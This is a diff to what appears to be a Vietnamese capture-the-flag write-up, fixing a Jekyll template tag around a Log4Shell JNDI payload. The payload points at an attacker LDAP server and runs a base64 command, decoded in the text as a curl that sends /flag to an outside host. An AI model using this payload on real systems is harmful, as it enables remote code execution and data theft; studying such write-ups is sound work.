@@ -268,7 +268,7 @@ Payload send để lấy flag
 {% highlight text %}
 {% raw %}
 ${jndi:ldap://165.22.109.11:1389/Deserialization/CommonsCollectionsK1/Command/Base64/Y3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==}
-{%  endraw %}
+{% endraw %}
 {% endhighlight %}
 
 Trong đó: `3VybCAtZCBAL2ZsYWcgaHR0cDovL3N1cWw0bWF0LnJlcXVlc3RyZXBvLmNvbQ==` là `curl -d @/flag http://suql4mat.requestrepo.com`
